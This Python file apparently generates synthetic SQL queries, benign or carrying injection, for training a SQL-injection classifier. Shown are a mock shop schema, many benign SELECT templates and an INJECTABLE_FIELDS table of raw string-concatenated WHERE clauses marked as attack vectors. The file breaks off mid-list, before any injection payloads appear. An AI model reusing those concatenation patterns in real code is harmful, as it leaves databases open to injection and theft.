# sql_query_generator.py
# Generates benign or SQLi-infected SQL queries for ML training datasets
# Usage: python main.py --benign | --malicious

import random
import argparse
import re
from datetime import date, timedelta

random.seed(1337)

N = 5000

# Synthetic schema (used only to keep queries coherent)
TABLES = {
    "users": ["user_id", "email", "first_name", "last_name", "created_at", "status", "country_code", "phone", "date_of_birth", "loyalty_points", "newsletter_subscribed"],
    "orders": ["order_id", "user_id", "order_date", "status", "total_amount", "currency", "shipping_address_id", "coupon_id", "notes", "updated_at"],
    "order_items": ["order_item_id", "order_id", "product_id", "quantity", "unit_price", "discount_amount", "tax_amount"],
    "products": ["product_id", "sku", "name", "category_id", "price", "is_active", "stock_quantity", "vendor_id", "weight", "description", "created_at"],
    "payments": ["payment_id", "order_id", "payment_date", "provider", "amount", "currency", "payment_status", "transaction_id", "refunded_amount"],
    "sessions": ["session_id", "user_id", "ip_address", "user_agent", "started_at", "ended_at", "page_views", "device_type"],
    "countries": ["country_code", "country_name", "region", "currency_code", "tax_rate"],
    "support_tickets": ["ticket_id", "user_id", "created_at", "priority", "ticket_status", "subject", "category", "assigned_to", "resolved_at"],
    "categories": ["category_id", "category_name", "parent_category_id", "description", "is_active"],
    "product_reviews": ["review_id", "product_id", "user_id", "rating", "review_text", "created_at", "helpful_count", "verified_purchase"],
    "inventory": ["inventory_id", "product_id", "warehouse_id", "quantity", "reserved_quantity", "last_updated", "reorder_level"],
    "warehouses": ["warehouse_id", "warehouse_name", "address", "city", "country_code", "capacity", "manager_id"],
    "shipping_addresses": ["address_id", "user_id", "address_line1", "address_line2", "city", "state", "postal_code", "country_code", "is_default", "phone"],
    "coupons": ["coupon_id", "coupon_code", "discount_type", "discount_value", "min_purchase_amount", "valid_from", "valid_until", "usage_limit", "times_used"],
    "cart": ["cart_id", "user_id", "created_at", "updated_at", "session_id"],
    "cart_items": ["cart_item_id", "cart_id", "product_id", "quantity", "added_at"],
    "wishlists": ["wishlist_id", "user_id", "product_id", "added_at", "priority"],
    "vendors": ["vendor_id", "vendor_name", "contact_email", "phone", "country_code", "rating", "is_active", "joined_at"],
    "returns": ["return_id", "order_id", "user_id", "return_date", "reason", "status", "refund_amount", "processed_by", "processed_at"],
    "subscriptions": ["subscription_id", "user_id", "plan_name", "price", "billing_cycle", "start_date", "end_date", "status", "auto_renew"],
    "invoices": ["invoice_id", "order_id", "user_id", "invoice_date", "due_date", "total_amount", "tax_amount", "paid_amount", "status"],
    "notifications": ["notification_id", "user_id", "type", "title", "message", "is_read", "created_at", "read_at"],
    "audit_logs": ["log_id", "user_id", "action", "table_name", "record_id", "old_value", "new_value", "ip_address", "timestamp"],
    "user_preferences": ["preference_id", "user_id", "language", "currency", "timezone", "email_notifications", "sms_notifications", "theme"],
    "product_images": ["image_id", "product_id", "image_url", "alt_text", "is_primary", "display_order", "uploaded_at"],
}

FIRST_NAMES = ["Alice", "Bob", "Carol", "David", "Eve", "Frank", "Grace", "Hannah", "Ivan", "Julia", "Ken", "Lina", "Mike", "Nancy", "Oscar", "Paula", "Quinn", "Rachel", "Sam", "Tina"]
LAST_NAMES = ["Smith", "Johnson", "Brown", "Taylor", "Anderson", "Thomas", "Jackson", "White", "Harris", "Martin", "Garcia", "Martinez", "Rodriguez", "Wilson", "Moore", "Lee", "Davis", "Miller"]
COUNTRIES = [("TR", "Türkiye", "EMEA"), ("DE", "Germany", "EMEA"), ("FR", "France", "EMEA"), ("US", "United States", "AMER"),
             ("BR", "Brazil", "AMER"), ("JP", "Japan", "APAC"), ("IN", "India", "APAC"), ("GB", "United Kingdom", "EMEA"),
             ("CA", "Canada", "AMER"), ("AU", "Australia", "APAC"), ("IT", "Italy", "EMEA"), ("ES", "Spain", "EMEA")]
STATUSES_USER = ["active", "inactive", "pending", "suspended", "verified"]
ORDER_STATUS = ["created", "paid", "processing", "shipped", "delivered", "cancelled", "refunded", "on_hold"]
PAYMENT_STATUS = ["authorized", "captured", "failed", "refunded", "pending", "cancelled"]
PROVIDERS = ["stripe", "paypal", "adyen", "iyzico", "square", "braintree", "authorize.net"]
PRODUCT_CATEGORIES = ["electronics", "books", "clothing", "home", "sports", "beauty", "toys", "automotive", "grocery", "jewelry", "pet_supplies", "garden", "office"]
CURRENCIES = ["TRY", "EUR", "USD", "GBP", "JPY", "CAD", "AUD"]
RETURN_REASONS = ["defective", "wrong_item", "not_as_described", "size_issue", "changed_mind", "damaged_in_shipping"]
RETURN_STATUS = ["pending", "approved", "rejected", "completed", "refunded"]
TICKET_CATEGORIES = ["technical", "billing", "shipping", "product_inquiry", "account", "returns", "other"]
SUBSCRIPTION_PLANS = ["basic", "premium", "enterprise", "pro", "starter"]
BILLING_CYCLES = ["monthly", "quarterly", "yearly", "weekly"]
DEVICE_TYPES = ["desktop", "mobile", "tablet", "smart_tv"]
NOTIFICATION_TYPES = ["order_update", "promotion", "system", "reminder", "newsletter"]
DISCOUNT_TYPES = ["percentage", "fixed_amount", "free_shipping"]
PRIORITIES = ["low", "medium", "high", "critical"]

# User-controlled injection target fields (realistic attack vectors)
# These are fields that typically accept user input in web applications
INJECTABLE_FIELDS = {
    "email_like": "email LIKE '%{input}%'",
    "user_id_eq": "user_id = {input}",
    "status_eq": "status = '{input}'",
    "username_like": "first_name LIKE '%{input}%'",
    "search_query": "name LIKE '%{input}%'",
    "order_status": "order_status = '{input}'",
    "coupon_code": "coupon_code = '{input}'",
    "phone_number": "phone = '{input}'",
    "product_sku": "sku = '{input}'",
    "category_name": "category_name = '{input}'",
}

def rand_date(start: date, end: date) -> str:
    delta = (end - start).days
    d = start + timedelta(days=random.randint(0, max(delta, 0)))
    return d.isoformat()

def rand_email(fn: str, ln: str) -> str:
    domain = random.choice(["example.com", "mail.test", "corp.local", "school.edu"])
    handle = f"{fn}.{ln}".lower()
    return f"{handle}@{domain}"

def q(s: str) -> str:
    # single-quote escape for benign literals
    return "'" + s.replace("'", "''") + "'"

def pick_user_id() -> int:
    return random.randint(1, 200000)

def pick_order_id() -> int:
    return random.randint(1, 500000)

def pick_product_id() -> int:
    return random.randint(1, 100000)

def pick_category_id() -> int:
    return random.randint(1, 50)

def pick_warehouse_id() -> int:
    return random.randint(1, 20)

def pick_vendor_id() -> int:
    return random.randint(1, 500)

def pick_review_id() -> int:
    return random.randint(1, 300000)

def pick_subscription_id() -> int:
    return random.randint(1, 50000)

def money() -> str:
    # keep it simple but varied
    return f"{random.randint(5, 5000)}.{random.randint(0,99):02d}"

def limit() -> int:
    return random.choice([5, 10, 20, 50, 100])

def like_pattern() -> str:
    base = random.choice(["ali", "bob", "car", "dav", "eve", "gra", "han", "iva", "jul", "ken", "lin"])
    return q(f"%{base}%")

def build_templates():
    # SELECT templates (benign, varied)
    select_templates = [
        lambda: f"SELECT user_id, email, created_at FROM users WHERE status = {q(random.choice(STATUSES_USER))} ORDER BY created_at DESC LIMIT {limit()};",
        lambda: f"SELECT order_id, user_id, total_amount, currency FROM orders WHERE user_id = {pick_user_id()} ORDER BY order_date DESC LIMIT {limit()};",
        lambda: f"SELECT p.product_id, p.sku, p.name, p.price FROM products p WHERE p.category_id = {pick_category_id()} AND p.is_active = 1 ORDER BY p.price ASC LIMIT {limit()};",
        lambda: f"""SELECT o.order_id, o.order_date, o.status, o.total_amount
FROM orders o
WHERE o.order_date BETWEEN {q(rand_date(date(2022,1,1), date(2023,12,31)))} AND {q(rand_date(date(2024,1,1), date(2025,12,31)))}
ORDER BY o.order_date DESC LIMIT {limit()};""",
        lambda: f"""SELECT u.user_id, u.email, c.country_name
FROM users u
JOIN countries c ON u.country_code = c.country_code
WHERE c.region = {q(random.choice(['EMEA','AMER','APAC']))}
ORDER BY u.user_id DESC LIMIT {limit()};""",
        lambda: f"""SELECT o.user_id, COUNT(*) AS order_count, SUM(o.total_amount) AS total_spent
FROM orders o
WHERE o.status IN ({q('paid')}, {q('shipped')}, {q('delivered')})
GROUP BY o.user_id
HAVING COUNT(*) >= {random.randint(2, 10)}
ORDER BY total_spent DESC LIMIT {limit()};""",
        lambda: f"""SELECT oi.order_id, SUM(oi.quantity * oi.unit_price) AS computed_total
FROM order_items oi
WHERE oi.order_id = {pick_order_id()}
GROUP BY oi.order_id;""",
        lambda: f"""SELECT u.user_id, u.email
FROM users u
WHERE u.email LIKE {like_pattern()}
ORDER BY u.created_at DESC LIMIT {limit()};""",
        lambda: f"""SELECT s.user_id, COUNT(*) AS session_count
FROM sessions s
WHERE s.started_at >= {q(rand_date(date(2024,1,1), date(2025,12,21)))}
GROUP BY s.user_id
ORDER BY session_count DESC LIMIT {limit()};""",
        lambda: f"""SELECT t.ticket_id, t.priority, t.ticket_status, t.created_at
FROM support_tickets t
WHERE t.priority IN ({q('low')}, {q('medium')}, {q('high')})
AND t.ticket_status = {q(random.choice(['open','pending','closed']))}
ORDER BY t.created_at DESC LIMIT {limit()};""",
        # Subquery example
        lambda: f"""SELECT u.user_id, u.email
FROM users u
WHERE u.user_id IN (
  SELECT o.user_id
  FROM orders o
  WHERE o.total_amount > {money()}
)
ORDER BY u.user_id DESC LIMIT {limit()};""",
        # Complex JOINs - Products with categories
        lambda: f"""SELECT p.product_id, p.sku, p.name, p.price, p.stock_quantity, c.category_name
FROM products p
JOIN categories c ON p.category_id = c.category_id
WHERE p.is_active = 1 AND p.stock_quantity > 0
ORDER BY p.price ASC LIMIT {limit()};""",
        lambda: f"""SELECT p.product_id, p.name, p.price, AVG(pr.rating) AS avg_rating, COUNT(pr.review_id) AS review_count
FROM products p
LEFT JOIN product_reviews pr ON p.product_id = pr.product_id
GROUP BY p.product_id, p.name, p.price
HAVING COUNT(pr.review_id) >= {random.randint(5, 50)}
ORDER BY avg_rating DESC LIMIT {limit()};""",
        # Inventory with products and warehouses
        lambda: f"""SELECT i.product_id, p.name, i.quantity, i.reserved_quantity, w.warehouse_name, w.city
FROM inventory i
JOIN products p ON i.product_id = p.product_id
JOIN warehouses w ON i.warehouse_id = w.warehouse_id
WHERE i.quantity < i.reorder_level
ORDER BY i.quantity ASC LIMIT {limit()};""",
        # Orders with payments
        lambda: f"""SELECT o.order_id, o.total_amount, p.amount AS payment_amount, p.payment_status, p.provider
FROM orders o
JOIN payments p ON o.order_id = p.order_id
WHERE p.payment_status = {q(random.choice(PAYMENT_STATUS))}
ORDER BY o.order_date DESC LIMIT {limit()};""",
        # Order items with products
        lambda: f"""SELECT oi.order_id, oi.product_id, p.name, oi.quantity, oi.unit_price, oi.discount_amount, oi.tax_amount
FROM order_items oi
JOIN products p ON oi.product_id = p.product_id
WHERE oi.order_id = {pick_order_id()};""",
        lambda: f"""SELECT oi.order_id, SUM(oi.quantity * oi.unit_price) AS subtotal, SUM(oi.discount_amount) AS total_discount, SUM(oi.tax_amount) AS total_tax
FROM order_items oi
WHERE oi.order_id = {pick_order_id()}
GROUP BY oi.order_id;""",
        # Session analytics with user info
        lambda: f"""SELECT s.user_id, u.email, COUNT(*) AS session_count, AVG(s.page_views) AS avg_page_views, s.device_type
FROM sessions s
JOIN users u ON s.user_id = u.user_id
WHERE s.started_at >= {q(rand_date(date(2024,1,1), date(2025,12,21)))}
GROUP BY s.user_id, u.email, s.device_type
ORDER BY session_count DESC LIMIT {limit()};""",
        # Support tickets with user info
        lambda: f"""SELECT t.ticket_id, t.subject, t.priority, t.ticket_status, t.category, t.created_at, u.email
FROM support_tickets t
JOIN users u ON t.user_id = u.user_id
WHERE t.priority IN ({q('medium')}, {q('high')}, {q('critical')})
AND t.ticket_status = {q(random.choice(['open','pending','in_progress']))}
ORDER BY t.priority DESC, t.created_at ASC LIMIT {limit()};""",
        # Product reviews with user and product info
        lambda: f"""SELECT pr.review_id, pr.product_id, p.name AS product_name, pr.rating, u.email, pr.helpful_count, pr.verified_purchase
FROM product_reviews pr
JOIN products p ON pr.product_id = p.product_id
JOIN users u ON pr.user_id = u.user_id
WHERE pr.rating >= {random.randint(4, 5)} AND pr.verified_purchase = 1
ORDER BY pr.helpful_count DESC LIMIT {limit()};""",
        # Vendor performance with product count
        lambda: f"""SELECT v.vendor_id, v.vendor_name, COUNT(p.product_id) AS product_count, v.rating, c.country_name
FROM vendors v
LEFT JOIN products p ON v.vendor_id = p.vendor_id
JOIN countries c ON v.country_code = c.country_code
WHERE v.is_active = 1
GROUP BY v.vendor_id, v.vendor_name, v.rating, c.country_name
ORDER BY v.rating DESC LIMIT {limit()};""",
        # Shipping addresses with user info
        lambda: f"""SELECT sa.address_id, u.email, sa.address_line1, sa.city, c.country_name, sa.is_default
FROM shipping_addresses sa
JOIN users u ON sa.user_id = u.user_id
JOIN countries c ON sa.country_code = c.country_code
WHERE sa.user_id = {pick_user_id()}
ORDER BY sa.is_default DESC;""",
        # Coupon usage with order count
        lambda: f"""SELECT c.coupon_id, c.coupon_code, c.discount_type, c.discount_value, c.times_used, c.usage_limit, COUNT(o.order_id) AS order_count
FROM coupons c
LEFT JOIN orders o ON c.coupon_id = o.coupon_id
WHERE c.valid_from <= {q(rand_date(date(2025,1,1), date(2025,12,21)))}
AND c.valid_until >= {q(rand_date(date(2025,1,1), date(2025,12,21)))}
AND c.times_used < c.usage_limit
GROUP BY c.coupon_id, c.coupon_code, c.discount_type, c.discount_value, c.times_used, c.usage_limit
ORDER BY c.discount_value DESC LIMIT {limit()};""",
        # Cart with items and products
        lambda: f"""SELECT c.cart_id, u.email, COUNT(ci.cart_item_id) AS item_count, c.updated_at, SUM(p.price * ci.quantity) AS total_value
FROM cart c
JOIN users u ON c.user_id = u.user_id
LEFT JOIN cart_items ci ON c.cart_id = ci.cart_id
LEFT JOIN products p ON ci.product_id = p.product_id
WHERE c.updated_at >= {q(rand_date(date(2025,11,1), date(2025,12,21)))}
GROUP BY c.cart_id, u.email, c.updated_at
HAVING COUNT(ci.cart_item_id) > 0
ORDER BY c.updated_at DESC LIMIT {limit()};""",
        # Returns with order and user info
        lambda: f"""SELECT r.return_id, r.order_id, u.email, r.reason, r.status, r.refund_amount, r.return_date
FROM returns r
JOIN users u ON r.user_id = u.user_id
WHERE r.status = {q(random.choice(RETURN_STATUS))}
ORDER BY r.return_date DESC LIMIT {limit()};""",
        lambda: f"""SELECT r.reason, COUNT(*) AS return_count, AVG(r.refund_amount) AS avg_refund
FROM returns r
WHERE r.return_date >= {q(rand_date(date(2024,1,1), date(2025,12,21)))}
GROUP BY r.reason
ORDER BY return_count DESC;""",
        # Subscription queries with user info
        lambda: f"""SELECT s.subscription_id, u.email, s.plan_name, s.price, s.billing_cycle, s.status, s.end_date
FROM subscriptions s
JOIN users u ON s.user_id = u.user_id
WHERE s.status = {q('active')} AND s.auto_renew = 1
ORDER BY s.end_date ASC LIMIT {limit()};""",
        # Invoice queries with order info
        lambda: f"""SELECT i.invoice_id, i.order_id, u.email, i.total_amount, i.tax_amount, i.paid_amount, i.status, o.order_date
FROM invoices i
JOIN users u ON i.user_id = u.user_id
JOIN orders o ON i.order_id = o.order_id
WHERE i.status = {q(random.choice(['paid', 'unpaid', 'overdue', 'cancelled']))}
ORDER BY i.invoice_date DESC LIMIT {limit()};""",
        # Complex 4-table JOIN - orders with user, payment, and shipping
        lambda: f"""SELECT u.user_id, u.email, o.order_id, o.total_amount, p.payment_status, p.provider, sa.city, sa.country_code
FROM users u
JOIN orders o ON u.user_id = o.user_id
JOIN payments p ON o.order_id = p.order_id
JOIN shipping_addresses sa ON o.shipping_address_id = sa.address_id
WHERE p.payment_status = {q('captured')} AND o.status = {q('delivered')}
ORDER BY o.order_date DESC LIMIT {limit()};""",
        # Complex 5-table JOIN - order details with everything
        lambda: f"""SELECT o.order_id, u.email, oi.product_id, p.name AS product_name, oi.quantity, oi.unit_price, pay.payment_status, c.category_name
FROM orders o
JOIN users u ON o.user_id = u.user_id
JOIN order_items oi ON o.order_id = oi.order_id
JOIN products p ON oi.product_id = p.product_id
JOIN categories c ON p.category_id = c.category_id
JOIN payments pay ON o.order_id = pay.order_id
WHERE o.order_date >= {q(rand_date(date(2025,1,1), date(2025,12,21)))}
ORDER BY o.order_date DESC LIMIT {limit()};""",
        # Wishlist with product and category info
        lambda: f"""SELECT w.wishlist_id, u.email, p.product_id, p.name, c.category_name, p.price, w.added_at
FROM wishlists w
JOIN users u ON w.user_id = u.user_id
JOIN products p ON w.product_id = p.product_id
JOIN categories c ON p.category_id = c.category_id
WHERE w.user_id = {pick_user_id()}
ORDER BY w.priority DESC, w.added_at DESC;""",
        # Products with vendor and category
        lambda: f"""SELECT p.product_id, p.name, p.price, v.vendor_name, c.category_name, p.stock_quantity
FROM products p
JOIN vendors v ON p.vendor_id = v.vendor_id
JOIN categories c ON p.category_id = c.category_id
WHERE p.is_active = 1 AND v.is_active = 1
ORDER BY p.created_at DESC LIMIT {limit()};""",
        # User order summary with country
        lambda: f"""SELECT u.user_id, u.email, u.first_name, u.last_name, c.country_name, COUNT(o.order_id) AS total_orders, SUM(o.total_amount) AS total_spent
FROM users u
JOIN countries c ON u.country_code = c.country_code
LEFT JOIN orders o ON u.user_id = o.user_id
WHERE u.status = {q('active')}
GROUP BY u.user_id, u.email, u.first_name, u.last_name, c.country_name
HAVING COUNT(o.order_id) > 0
ORDER BY total_spent DESC LIMIT {limit()};""",
        # Product reviews summary with vendor
        lambda: f"""SELECT p.product_id, p.name, v.vendor_name, AVG(pr.rating) AS avg_rating, COUNT(pr.review_id) AS review_count, p.price
FROM products p
JOIN vendors v ON p.vendor_id = v.vendor_id
LEFT JOIN product_reviews pr ON p.product_id = pr.product_id
WHERE p.is_active = 1
GROUP BY p.product_id, p.name, v.vendor_name, p.price
HAVING COUNT(pr.review_id) >= {random.randint(3, 20)}
ORDER BY avg_rating DESC LIMIT {limit()};""",
        # Orders with multiple joins for full details
        lambda: f"""SELECT o.order_id, u.email, o.total_amount, o.status, pay.provider, pay.payment_status, sa.city, sa.country_code, o.order_date
FROM orders o
JOIN users u ON o.user_id = u.user_id
LEFT JOIN payments pay ON o.order_id = pay.order_id
LEFT JOIN shipping_addresses sa ON o.shipping_address_id = sa.address_id
WHERE o.order_date >= {q(rand_date(date(2024,1,1), date(2025,12,21)))}
ORDER BY o.order_date DESC LIMIT {limit()};""",
        # Subquery with JOIN
        lambda: f"""SELECT p.product_id, p.name, p.price, v.vendor_name
FROM products p
JOIN vendors v ON p.vendor_id = v.vendor_id
WHERE p.product_id IN (
  SELECT pr.product_id
  FROM product_reviews pr
  WHERE pr.rating >= 4
  GROUP BY pr.product_id
  HAVING COUNT(*) >= 10
)
AND p.is_active = 1
ORDER BY p.price DESC LIMIT {limit()};""",

        # =====================================================================
        # SIMPLE QUERY TEMPLATES - Essential for model to recognize basic SQL
        # These prevent false positives on legitimate simple queries
        # =====================================================================
        
        # --- SELECT * (bare table scans) ---
        lambda: f"SELECT * FROM {random.choice(list(TABLES.keys()))};",
        lambda: f"SELECT * FROM {random.choice(list(TABLES.keys()))} LIMIT {limit()};",
        lambda: f"SELECT * FROM users;",
        lambda: f"SELECT * FROM orders;",
        lambda: f"SELECT * FROM products;",
        lambda: f"SELECT * FROM categories;",
        lambda: f"SELECT * FROM payments;",
        lambda: f"SELECT * FROM sessions;",
        lambda: f"SELECT * FROM support_tickets;",
        lambda: f"SELECT * FROM product_reviews;",
        lambda: f"SELECT * FROM inventory;",
        lambda: f"SELECT * FROM vendors;",
        lambda: f"SELECT * FROM countries;",
        lambda: f"SELECT * FROM coupons;",
        lambda: f"SELECT * FROM cart;",
        lambda: f"SELECT * FROM wishlists;",
        lambda: f"SELECT * FROM returns;",
        lambda: f"SELECT * FROM subscriptions;",
        lambda: f"SELECT * FROM invoices;",
        lambda: f"SELECT * FROM notifications;",
        
        # --- Simple column selections ---
        lambda: f"SELECT user_id, email FROM users;",
        lambda: f"SELECT user_id, email, first_name FROM users;",
        lambda: f"SELECT order_id, user_id, total_amount FROM orders;",
        lambda: f"SELECT product_id, name, price FROM products;",
        lambda: f"SELECT category_id, category_name FROM categories;",
        lambda: f"SELECT vendor_id, vendor_name, rating FROM vendors;",
        lambda: f"SELECT payment_id, order_id, amount FROM payments;",
        lambda: f"SELECT ticket_id, priority, ticket_status FROM support_tickets;",
        lambda: f"SELECT review_id, product_id, rating FROM product_reviews;",
        lambda: f"SELECT session_id, user_id, ip_address FROM sessions;",
        lambda: f"SELECT coupon_id, coupon_code, discount_value FROM coupons;",
        lambda: f"SELECT invoice_id, total_amount, status FROM invoices;",
        lambda: f"SELECT return_id, reason, status FROM returns;",
        lambda: f"SELECT subscription_id, plan_name, price FROM subscriptions;",
        lambda: (lambda t: f"SELECT {', '.join(random.sample(TABLES[t], min(3, len(TABLES[t]))))} FROM {t};")(random.choice(list(TABLES.keys()))),
        lambda: (lambda t: f"SELECT {', '.join(random.sample(TABLES[t], min(2, len(TABLES[t]))))} FROM {t};")(random.choice(list(TABLES.keys()))),
        
        # --- Simple WHERE with single ID condition ---
        lambda: f"SELECT * FROM users WHERE user_id = {pick_user_id()};",
        lambda: f"SELECT * FROM orders WHERE order_id = {pick_order_id()};",
        lambda: f"SELECT * FROM products WHERE product_id = {pick_product_id()};",
        lambda: f"SELECT * FROM categories WHERE category_id = {pick_category_id()};",
        lambda: f"SELECT * FROM vendors WHERE vendor_id = {pick_vendor_id()};",
        lambda: f"SELECT * FROM warehouses WHERE warehouse_id = {pick_warehouse_id()};",
        lambda: f"SELECT * FROM orders WHERE user_id = {pick_user_id()};",
        lambda: f"SELECT * FROM payments WHERE order_id = {pick_order_id()};",
        lambda: f"SELECT * FROM product_reviews WHERE product_id = {pick_product_id()};",
        lambda: f"SELECT * FROM sessions WHERE user_id = {pick_user_id()};",
        lambda: f"SELECT * FROM support_tickets WHERE user_id = {pick_user_id()};",
        lambda: f"SELECT * FROM cart WHERE user_id = {pick_user_id()};",
        lambda: f"SELECT * FROM wishlists WHERE user_id = {pick_user_id()};",
        lambda: f"SELECT * FROM shipping_addresses WHERE user_id = {pick_user_id()};",
        lambda: f"SELECT * FROM subscriptions WHERE user_id = {pick_user_id()};",
        lambda: f"SELECT * FROM invoices WHERE order_id = {pick_order_id()};",
        lambda: f"SELECT * FROM returns WHERE order_id = {pick_order_id()};",
        lambda: f"SELECT * FROM notifications WHERE user_id = {pick_user_id()};",
        lambda: f"SELECT * FROM inventory WHERE product_id = {pick_product_id()};",
        lambda: f"SELECT * FROM order_items WHERE order_id = {pick_order_id()};",
        
        # --- Simple status/string equality ---
        lambda: f"SELECT * FROM users WHERE status = {q(random.choice(STATUSES_USER))};",
        lambda: f"SELECT * FROM orders WHERE status = {q(random.choice(ORDER_STATUS))};",
        lambda: f"SELECT * FROM payments WHERE payment_status = {q(random.choice(PAYMENT_STATUS))};",
        lambda: f"SELECT * FROM products WHERE is_active = 1;",
        lambda: f"SELECT * FROM products WHERE is_active = 0;",
        lambda: f"SELECT * FROM vendors WHERE is_active = 1;",
        lambda: f"SELECT * FROM categories WHERE is_active = 1;",
        lambda: f"SELECT * FROM support_tickets WHERE priority = {q(random.choice(PRIORITIES))};",
        lambda: f"SELECT * FROM support_tickets WHERE ticket_status = {q(random.choice(['open', 'pending', 'closed']))};",
        lambda: f"SELECT * FROM returns WHERE status = {q(random.choice(RETURN_STATUS))};",
        lambda: f"SELECT * FROM subscriptions WHERE status = {q(random.choice(['active', 'cancelled', 'expired']))};",
        lambda: f"SELECT * FROM users WHERE country_code = {q(random.choice([c[0] for c in COUNTRIES]))};",
        lambda: f"SELECT * FROM countries WHERE region = {q(random.choice(['EMEA', 'AMER', 'APAC']))};",
        lambda: f"SELECT * FROM sessions WHERE device_type = {q(random.choice(DEVICE_TYPES))};",
        lambda: f"SELECT * FROM notifications WHERE type = {q(random.choice(NOTIFICATION_TYPES))};",
        lambda: f"SELECT * FROM coupons WHERE discount_type = {q(random.choice(DISCOUNT_TYPES))};",
        
        # --- Simple COUNT queries ---
        lambda: f"SELECT COUNT(*) FROM users;",
        lambda: f"SELECT COUNT(*) FROM orders;",
        lambda: f"SELECT COUNT(*) FROM products;",
        lambda: f"SELECT COUNT(*) FROM sessions;",
        lambda: f"SELECT COUNT(*) FROM support_tickets;",
        lambda: f"SELECT COUNT(*) FROM {random.choice(list(TABLES.keys()))};",
        lambda: f"SELECT COUNT(*) FROM users WHERE status = {q(random.choice(STATUSES_USER))};",
        lambda: f"SELECT COUNT(*) FROM orders WHERE status = {q(random.choice(ORDER_STATUS))};",
        lambda: f"SELECT COUNT(*) FROM products WHERE is_active = 1;",
        lambda: f"SELECT COUNT(*) FROM orders WHERE user_id = {pick_user_id()};",
        lambda: f"SELECT COUNT(*) FROM product_reviews WHERE product_id = {pick_product_id()};",
        lambda: f"SELECT COUNT(user_id) FROM users;",
        lambda: f"SELECT COUNT(order_id) FROM orders;",
        lambda: f"SELECT COUNT(DISTINCT user_id) FROM orders;",
        lambda: f"SELECT COUNT(DISTINCT product_id) FROM order_items;",
        lambda: f"SELECT COUNT(DISTINCT category_id) FROM products;",
        
        # --- Simple SUM/AVG/MIN/MAX ---
        lambda: f"SELECT SUM(total_amount) FROM orders;",
        lambda: f"SELECT AVG(total_amount) FROM orders;",
        lambda: f"SELECT MIN(price) FROM products;",
        lambda: f"SELECT MAX(price) FROM products;",
        lambda: f"SELECT SUM(quantity) FROM inventory;",
        lambda: f"SELECT AVG(rating) FROM product_reviews;",
        lambda: f"SELECT MIN(created_at) FROM users;",
        lambda: f"SELECT MAX(order_date) FROM orders;",
        lambda: f"SELECT SUM(total_amount) FROM orders WHERE user_id = {pick_user_id()};",
        lambda: f"SELECT AVG(rating) FROM product_reviews WHERE product_id = {pick_product_id()};",
        lambda: f"SELECT MIN(price), MAX(price) FROM products;",
        lambda: f"SELECT AVG(price), COUNT(*) FROM products;",
        
        # --- Simple DISTINCT ---
        lambda: f"SELECT DISTINCT status FROM users;",
        lambda: f"SELECT DISTINCT status FROM orders;",
        lambda: f"SELECT DISTINCT country_code FROM users;",
        lambda: f"SELECT DISTINCT category_id FROM products;",
        lambda: f"SELECT DISTINCT vendor_id FROM products;",
        lambda: f"SELECT DISTINCT payment_status FROM payments;",
        lambda: f"SELECT DISTINCT priority FROM support_tickets;",
        lambda: f"SELECT DISTINCT device_type FROM sessions;",
        lambda: f"SELECT DISTINCT region FROM countries;",
        lambda: f"SELECT DISTINCT plan_name FROM subscriptions;",
        lambda: f"SELECT DISTINCT billing_cycle FROM subscriptions;",
        lambda: f"SELECT DISTINCT reason FROM returns;",
        
        # --- Simple ORDER BY ---
        lambda: f"SELECT * FROM users ORDER BY created_at;",
        lambda: f"SELECT * FROM users ORDER BY created_at DESC;",
        lambda: f"SELECT * FROM orders ORDER BY order_date;",
        lambda: f"SELECT * FROM orders ORDER BY order_date DESC;",
        lambda: f"SELECT * FROM products ORDER BY price;",
        lambda: f"SELECT * FROM products ORDER BY price DESC;",
        lambda: f"SELECT * FROM products ORDER BY name;",
        lambda: f"SELECT * FROM vendors ORDER BY rating DESC;",
        lambda: f"SELECT * FROM product_reviews ORDER BY rating DESC;",
        lambda: f"SELECT * FROM support_tickets ORDER BY created_at DESC;",
        lambda: f"SELECT product_id, name, price FROM products ORDER BY price ASC;",
        lambda: f"SELECT user_id, email FROM users ORDER BY user_id;",
        
        # --- Simple LIMIT without ORDER BY ---
        lambda: f"SELECT * FROM users LIMIT {limit()};",
        lambda: f"SELECT * FROM orders LIMIT {limit()};",
        lambda: f"SELECT * FROM products LIMIT {limit()};",
        lambda: f"SELECT * FROM sessions LIMIT {limit()};",
        lambda: f"SELECT * FROM payments LIMIT {limit()};",
        lambda: f"SELECT user_id, email FROM users LIMIT {limit()};",
        lambda: f"SELECT product_id, name FROM products LIMIT {limit()};",
        lambda: f"SELECT order_id, total_amount FROM orders LIMIT {limit()};",
        
        # --- Simple ORDER BY with LIMIT ---
        lambda: f"SELECT * FROM users ORDER BY created_at DESC LIMIT {limit()};",
        lambda: f"SELECT * FROM orders ORDER BY order_date DESC LIMIT {limit()};",
        lambda: f"SELECT * FROM products ORDER BY price ASC LIMIT {limit()};",
        lambda: f"SELECT * FROM products ORDER BY price DESC LIMIT {limit()};",
        lambda: f"SELECT * FROM vendors ORDER BY rating DESC LIMIT {limit()};",
        lambda: f"SELECT * FROM product_reviews ORDER BY helpful_count DESC LIMIT {limit()};",
        lambda: f"SELECT product_id, name, price FROM products ORDER BY price LIMIT {limit()};",
        lambda: f"SELECT user_id, email, created_at FROM users ORDER BY created_at LIMIT {limit()};",
        
        # --- Simple numeric comparisons ---
        lambda: f"SELECT * FROM products WHERE price > {money()};",
        lambda: f"SELECT * FROM products WHERE price < {money()};",
        lambda: f"SELECT * FROM products WHERE price >= {money()};",
        lambda: f"SELECT * FROM products WHERE price <= {money()};",
        lambda: f"SELECT * FROM orders WHERE total_amount > {money()};",
        lambda: f"SELECT * FROM orders WHERE total_amount < {money()};",
        lambda: f"SELECT * FROM products WHERE stock_quantity > {random.randint(0, 100)};",
        lambda: f"SELECT * FROM products WHERE stock_quantity = 0;",
        lambda: f"SELECT * FROM product_reviews WHERE rating >= {random.randint(3, 5)};",
        lambda: f"SELECT * FROM product_reviews WHERE rating = {random.randint(1, 5)};",
        lambda: f"SELECT * FROM users WHERE loyalty_points > {random.randint(100, 2000)};",
        lambda: f"SELECT * FROM inventory WHERE quantity < {random.randint(10, 100)};",
        lambda: f"SELECT * FROM vendors WHERE rating >= {random.uniform(3.0, 4.5):.1f};",
        
        # --- Simple BETWEEN ---
        lambda: f"SELECT * FROM products WHERE price BETWEEN {random.randint(10, 100)} AND {random.randint(200, 1000)};",
        lambda: f"SELECT * FROM orders WHERE total_amount BETWEEN {random.randint(50, 200)} AND {random.randint(500, 2000)};",
        lambda: f"SELECT * FROM product_reviews WHERE rating BETWEEN 3 AND 5;",
